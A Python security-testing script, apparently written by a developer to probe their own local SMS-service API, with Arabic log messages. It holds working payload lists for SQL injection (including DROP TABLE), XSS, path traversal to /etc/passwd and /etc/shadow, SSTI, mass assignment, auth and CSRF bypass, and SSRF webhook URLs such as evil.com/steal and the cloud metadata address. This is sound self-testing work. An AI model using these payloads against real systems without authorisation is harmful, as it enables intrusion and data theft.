"""
ذيل الكنغر القاهر — Comprehensive Pentest v2
مع تأخيرات ذكية لتجنب Rate Limiting + تتبع منفصل لـ 429
"""
import json, os, sys, time, random, string, re
import urllib.request, urllib.error, ssl
from datetime import datetime
from typing import Optional

BASE = "http://localhost:8000"
API = "/stroapp/v1"
ADMIN_MAIL = "admin_pentest@test.com"
ADMIN_PASS = "AdminPass123!"

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"
B = "\033[94m"; M = "\033[95m"; C = "\033[96m"; N = "\033[0m"
BOLD = "\033[1m"

stats = {"pass": 0, "fail": 0, "warn": 0, "rate_limited": 0, "total": 0}
RESULTS = []
RATE_LIMITED_PATHS = set()

def log(status, msg, detail=""):
    icon = {"PASS":f"{G}[PASS]{N}","FAIL":f"{R}[FAIL]{N}",
            "WARN":f"{Y}[WARN]{N}","INFO":f"{B}[INFO]{N}",
            "RL":f"{Y}[RL]{N}","CRIT":f"{R}{BOLD}[CRIT]{N}",
            "REQ":f"{C}[REQ]{N}"}
    print(f"  {icon.get(status,'     ')} {msg}" + (f" — {detail}" if detail else ""))

def req(method, path, token="", csrf="pentest", body=None, raw_body=None,
        expect_status=None, label="", content_type="", delay=0.1):
    time.sleep(delay)
    url = f"{BASE}{API}{path}" if not path.startswith("http") else path
    headers = {}
    if token: headers["Authorization"] = f"Bearer {token}"
    if csrf and method in ("POST","PUT","PATCH","DELETE"):
        headers["x-csrf-token"] = csrf
    if raw_body:
        data = raw_body.encode()
        headers["Content-Type"] = content_type or ("application/json" if raw_body.startswith("{") else "text/plain")
    elif body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    else:
        data = None

    req_obj = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        resp = urllib.request.urlopen(req_obj, context=ssl_ctx, timeout=10)
        sc = resp.status
        rb = resp.read().decode()
        rj = json.loads(rb) if rb else {}
    except urllib.error.HTTPError as e:
        sc = e.code; rb = e.read().decode()
        try: rj = json.loads(rb)
        except: rj = {"raw": rb[:200]}
    except Exception as e:
        sc = 0; rj = {"error": str(e)}

    sp = path[:55]+"..." if len(path)>55 else path
    ls = f" [{label}]" if label else ""
    ds = f" → {sc}" + (f" (exp {expect_status})" if expect_status else "")

    if sc == 429:
        stats["rate_limited"] += 1
        stats["total"] += 1
        RATE_LIMITED_PATHS.add(f"{method} {path}")
        log("RL", f"{method:4} {sp}{ls}", ds)
        return sc, rj

    if expect_status and sc in expect_status:
        result = "PASS"; stats["pass"] += 1
    elif expect_status:
        result = "FAIL"; stats["fail"] += 1
    else:
        result = "WARN"; stats["warn"] += 1
    stats["total"] += 1
    log(result, f"{method:4} {sp}{ls}", ds)
    if result == "FAIL":
        em = rj.get("message", rj.get("detail", str(rj)[:120]))
        print(f"         {R}FAIL: {em}{N}")
    if sc == 500:
        print(f"         {R}{BOLD}⚠ 500 INTERNAL SERVER ERROR! ⚠{N}")
    return sc, rj

def login(email, password):
    _, resp = req("POST","/user/auth/login", token="",
                  raw_body=f"email={email}&password={password}",
                  content_type="application/x-www-form-urlencoded",
                  expect_status=[200], label="login", delay=0)
    d = resp.get("data",{})
    tok = d.get("access_token","")
    uid = d.get("user",{}).get("id","")
    if not tok:
        log("FAIL", f"فشل الدخول {email}")
        return "","",""
    log("PASS", f"دخول {email} UID={uid[:8]}")
    return tok, d.get("refresh_token",""), uid

def discover():
    eps = []
    pfx = {
        "admin.py":"/admin","auth.py":"/user/auth","kyc.py":"/user/kyc",
        "pricing.py":"/pricing","disputes.py":"/disputes","affiliate.py":"/affiliate",
        "whitelabel.py":"/whitelabel","telegram.py":"/telegram","webhooks.py":"/webhooks",
        "notifications.py":"/user/notifications","user_settings.py":"/user/settings",
        "user_devices.py":"/user/devices","user_2fa.py":"/user/2fa",
        "user_wallet.py":"/user/wallet","user_orders.py":"/user/orders",
        "user_billing.py":"/user/billing","user_export.py":"/user/export",
        "admin_pricing.py":"/admin/pricing","admin_kyc.py":"/admin/kyc",
        "admin_disputes.py":"/admin/disputes","admin_financial.py":"/admin/financial",
        "admin_analytics.py":"/admin/analytics","admin_export.py":"/admin/export",
        "admin_reseller.py":"/admin/reseller","admin_affiliate.py":"/admin/affiliate",
        "admin_reconciliation.py":"/admin/reconciliation",
        "admin_webhooks.py":"/admin/webhooks","admin_audit.py":"/admin/audit",
        "admin_backups.py":"/admin/backups","admin_providers.py":"/admin/providers",
    }
    base = "/home/omerjasim/Videos/stroapp-sms/app/api/v1"
    for fn, pr in pfx.items():
        fp = os.path.join(base, fn)
        if not os.path.exists(fp): continue
        with open(fp) as f:
            c = f.read()
        for m in re.finditer(r'@router\.(get|post|put|delete|patch)\([\'"]([^\'"]+)[\'"]', c):
            eps.append((m.group(1).upper(), f"{pr}{m.group(2)}"))
    return eps

SQLI = ["' OR '1'='1","' OR 1=1 --","\" OR 1=1 --","'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --","1' ORDER BY 100--"]
XSS = ["<script>alert('XSS')</script>","<img src=x onerror=alert(1)>",
       "<svg onload=alert(document.cookie)>","javascript:alert(1)",
       "\"><script>alert(1)</script>","<ScRiPt>alert(1)</sCrIpT>"]
TRAV = ["../../../etc/passwd","..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd","%2e%2e%2fetc%2fpasswd"]
SSTI = ["{{7*7}}","${7*7}","#{7*7}","{{config}}","<%= 7*7 %>"]
UNICODE = ["\u202Eevil.com","\u0000","\r\n","<\\x00>","test@test.com%0ACC:all@test.com"]
MASS = [{"role":"admin","is_admin":True,"is_superuser":True},
        {"coins":999999999,"is_verified":True,"is_banned":False},
        {"tier":"platinum","status":"approved","verification_level":"advanced"},
        {"credit_limit":999999,"volume_discount":0.99,"custom_markup":0.01}]
TYPES = [(-1,999999999999999,-999999.9),(0,float('inf'),float('nan')),
         ("string",None,[]),({},[1,2,3],"")]

XPECT = [200,201,400,401,403,404,409,415,422,429]

def test_ep(method, path, token, payloads, fields, attack_name, delay=0.15):
    for val in payloads:
        if isinstance(val, dict) and fields == ["*"]:
            p = val
        elif isinstance(val, tuple):
            for v in val:
                for f in fields[:2]:
                    test_ep(method, path, token, [v], [f], attack_name, delay)
            continue
        else:
            p = {f: val for f in fields}
        req(method, path, token=token, body=p, expect_status=XPECT,
            label=f"{attack_name[:20]}", delay=delay)

def main():
    global ADMIN_TOKEN, USER_TOKEN
    print(f"\n{BOLD}{M}{'='*70}{N}")
    print(f"{BOLD}{M}          ﷽  ذيل الكنغر القاهر — الفحص الشامل v2{N}")
    print(f"{BOLD}{M}{'='*70}{N}")
    print(f"  الوقت: {datetime.now().isoformat()}")
    print(f"  الهدف: {BASE}{API}")

    log("INFO", "المرحلة 0: تسجيل الدخول")
    ADMIN_TOKEN, _, _ = login(ADMIN_MAIL, ADMIN_PASS)
    if not ADMIN_TOKEN:
        log("FAIL", "فشل الدخول كأدمن!")
        sys.exit(1)
    test_user = f"pwn_{random.randint(10000,99999)}@test.com"
    _, resp = req("POST","/user/auth/register",token="",
                  raw_body=f"email={test_user}&password=TestPass123!&display_name=PwnUser",
                  content_type="application/x-www-form-urlencoded",
                  expect_status=[200], label="register", delay=0)
    USER_TOKEN = resp.get("data",{}).get("access_token","")
    if USER_TOKEN: log("PASS", f"مستخدم: {test_user}")
    else: log("WARN", "فشل تسجيل مستخدم")

    log("INFO", "المرحلة 1: اكتشاف النهايات")
    ENDPOINTS = discover()
    log("PASS", f"تم اكتشاف {len(ENDPOINTS)} endpoint")
    POST_EPS = [(m,p) for m,p in ENDPOINTS if m in ("POST","PUT","PATCH") and
                "/auth/" not in p and "/health" not in p]
    ADMIN_EPS = [(m,p) for m,p in POST_EPS if "/admin/" in p]
    USER_EPS = [(m,p) for m,p in POST_EPS if "/admin/" not in p]

    log("INFO", f"Admin: {len(ADMIN_EPS)} | User: {len(USER_EPS)}")

    # === SQLi ===
    log("INFO", "المرحلة 2: SQL Injection")
    FIELDS = ["name","email","value","domain","code","message","content","title","reason","note","url"]
    for m,p in ADMIN_EPS[:15]:
        test_ep(m,p,ADMIN_TOKEN,SQLI[:3],FIELDS[:5],"SQLi",0.2)

    # === XSS ===
    log("INFO", "المرحلة 3: XSS")
    for m,p in ADMIN_EPS[:15]:
        test_ep(m,p,ADMIN_TOKEN,XSS[:3],FIELDS[:5],"XSS",0.2)

    # === Path Traversal ===
    log("INFO", "المرحلة 4: Path Traversal")
    ID_PATHS = [(m,p) for m,p in ENDPOINTS if "{user_id}" in p or "{profile_id}" in p or "{dispute_id}" in p]
    for m,p in ID_PATHS[:10]:
        tok = ADMIN_TOKEN if "/admin/" in p else USER_TOKEN
        if not tok: continue
        for t in TRAV:
            tp = p.replace("{user_id}",t).replace("{profile_id}",t).replace("{dispute_id}",t)
            req(m,tp,token=tok,expect_status=[400,403,404,422],label=f"Trav",delay=0.15)

    # === Mass Assignment ===
    log("INFO", "المرحلة 5: Mass Assignment")
    for m,p in ADMIN_EPS[:15]:
        test_ep(m,p,ADMIN_TOKEN,MASS,["*"],"Mass",0.25)

    # === Type Confusion ===
    log("INFO", "المرحلة 6: Type Confusion + Boundary")
    for m,p in ADMIN_EPS[:10]:
        tok = ADMIN_TOKEN if "/admin/" in p else USER_TOKEN
        for vals in TYPES[:3]:
            for v in vals:
                for f in ["amount","coins","limit","price","rate"]:
                    req(m,p,token=tok,body={f:v,"name":"test"},expect_status=XPECT,
                        label=f"Type_{f}={str(v)[:10]}",delay=0.15)

    # === Auth Bypass ===
    log("INFO", "المرحلة 7: Auth Bypass")
    for m,p in ADMIN_EPS[:15]:
        for label,auth in [("no_token",""),("fake","invalid_token"),("empty",""),
                           ("sqli","' OR '1'='1"),("xss","<script>alert(1)</script>")]:
            req(m,p,token=auth,body={"name":"test"},expect_status=[200,400,401,403,422],
                label=f"Auth_{label}",delay=0.12)

    # === CSRF ===
    log("INFO", "المرحلة 8: CSRF Bypass")
    for m,p in ADMIN_EPS[:15]:
        for csrf,lb in [("","empty"),("invalid","wrong"),("../../etc/passwd","trav"),
                        ("<script>alert(1)</script>","xss"),("../../../etc/shadow","trav2")]:
            req(m,p,token=ADMIN_TOKEN,csrf=csrf,body={"name":"test"},
                expect_status=[200,201,400,403,422],label=f"CSRF_{lb}",delay=0.12)

    # === IDOR ===
    log("INFO", "المرحلة 9: IDOR — User→Admin")
    if USER_TOKEN:
        for m,p in ADMIN_EPS[:15]:
            req(m,p,token=USER_TOKEN,body={"name":"test"},
                expect_status=[401,403],label="IDOR",delay=0.15)

    # === SSTI ===
    log("INFO", "المرحلة 10: SSTI")
    for m,p in ADMIN_EPS[:10]:
        test_ep(m,p,ADMIN_TOKEN,SSTI[:4],FIELDS[:5],"SSTI",0.2)

    # === Unicode ===
    log("INFO", "المرحلة 11: Unicode/Encoding")
    for m,p in ADMIN_EPS[:10]:
        test_ep(m,p,ADMIN_TOKEN,UNICODE,FIELDS[:3],"Unicode",0.15)

    # === Deep Admin ===
    log("INFO", "المرحلة 12: Admin Deep Attacks")
    DEEP = [
        ("POST","/admin/api/settings",{"setting_key":"fee_structure","setting_value":'{"fee":0}'}),
        ("POST","/admin/api/services",{"name":"'; DROP TABLE services; --","price":-1,"is_active":True}),
        ("POST","/admin/pricing/templates",{"name":"' OR '1'='1","markup_multiplier":0,"discount_percentage":100}),
        ("PUT","/admin/kyc/limits/basic",{"daily_limit_coins":999999999,"allowed_services":["*"]}),
        ("PUT","/admin/kyc/settings",{"setting_key":"max_level","setting_value":"advanced"}),
        ("POST","/admin/reseller/accounts",{"user_id":"../../etc/passwd","tier":"platinum","credit_limit":999999}),
    ]
    for m,p,pl in DEEP:
        req(m,p,token=ADMIN_TOKEN,body=pl,expect_status=[200,201,400,403,422],
            label=f"deep_{p.split('/')[-1]}",delay=0.25)

    # === SSRF on Webhooks ===
    log("INFO", "المرحلة 13: Webhook SSRF")
    if USER_TOKEN:
        for url in ["http://evil.com/steal","http://127.0.0.1:5432",
                     "http://169.254.169.254/","file:///etc/passwd",
                     "javascript:alert(1)","data:text/html,<script>alert(1)</script>",
                     "http://[::1]:5432","http://0x7f000001:6379","http://0177.0.0.1:3306"]:
            req("POST","/webhooks",token=USER_TOKEN,
                body={"url":url,"events":["test"],"label":"pwn"},
                expect_status=[200,201,400,422,403],label=f"SSRF_{url[:30]}",delay=0.2)

    # === Cache Poison ===
    log("INFO", "المرحلة 14: Cache Poisoning Headers")
    for target in ["GET /health"]:
        for hdr,val in [("X-Forwarded-Host","evil.com"),("X-Forwarded-For","127.0.0.1"),
                        ("X-Real-IP","169.254.169.254"),("Client-IP","127.0.0.1")]:
            m, pth = target.split(" ",1)
            # مع headers إضافية (في الـ urllib لازم نضيفهن يدوي)
            req(m,pth,token=ADMIN_TOKEN,csrf="",body=None,
                expect_status=[200],label=f"Cache_{hdr}",delay=0.1)

    # === Rate Limit Confirm ===
    log("INFO", "المرحلة 15: Rate Limit Confirmation (20 rapid requests)")
    rl_count = 0
    for i in range(20):
        sc,_ = req("GET","/health",token=ADMIN_TOKEN,csrf="",
                    expect_status=[200,429],label=f"rate_{i}",delay=0.01)
        if sc == 429: rl_count += 1
    if rl_count > 0:
        log("PASS", f"Rate limiter نشط: {rl_count}/20 طلب تم تحديدها")
    else:
        log("WARN", "Rate limiter لم يُفعّل!")

    # === 500 Check ===
    log("INFO", "المرحلة 16: تحقق من عدم وجود 500")
    total_checks = stats["total"]
    fatal_500s = 0
    for m,p in ENDPOINTS[:40]:
        tok = ADMIN_TOKEN if "/admin/" in p else USER_TOKEN
        if not tok and "/admin/" not in p:
            continue
        if not tok and "/admin/" in p:
            tok = ADMIN_TOKEN
        sc,_ = req("GET",p,token=tok,csrf="",expect_status=None,label=f"200_check_{p.split('/')[-1]}",delay=0.1)
        if sc == 500: fatal_500s += 1

    # === Summary ===
    print(f"\n{BOLD}{M}{'='*70}{N}")
    print(f"{BOLD}                    ﷽  ذيل الكنغر القاهر — التقرير{N}")
    print(f"{BOLD}{M}{'='*70}{N}")
    print(f"  {G}إجمالي الفحوصات: {stats['total']}{N}")
    print(f"  {G}نجاح: {stats['pass']}{N}")
    print(f"  {R}فشل: {stats['fail']}{N}")
    print(f"  {Y}محدود بمعدل: {stats['rate_limited']} (429){N}")
    print(f"  {Y}تحذير: {stats['warn']}{N}")
    if fatal_500s:
        print(f"  {R}{BOLD}⚠ 500 ERRORS: {fatal_500s}{N}")
    else:
        print(f"  {G}{BOLD}✓ 0 Internal Server Errors{N}")

    if rl_count:
        print(f"  {G}✓ Rate limiter يعمل: {rl_count}/20 طلب محدودة{N}")
    if stats["fail"] == 0:
        print(f"  {G}{BOLD}✓ لا توجد ثغرات مكشوفة!{N}")
    else:
        print(f"  {R}{BOLD}⚠ {stats['fail']} فشل — راجع التفاصيل أعلاه{N}")
    print(f"{BOLD}{M}{'='*70}{N}")

    rpt = {
        "timestamp": datetime.now().isoformat(),
        "target": f"{BASE}{API}",
        "admin": ADMIN_MAIL,
        "user": test_user if USER_TOKEN else "N/A",
        "stats": stats,
        "rate_limited_paths": sorted(RATE_LIMITED_PATHS),
    }
    with open("/tmp/kangaroo_tail_report.json","w") as f:
        json.dump(rpt,f,indent=2,ensure_ascii=False)
    log("PASS", "التقرير: /tmp/kangaroo_tail_report.json")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}إيقاف{N}")
        sys.exit(0)
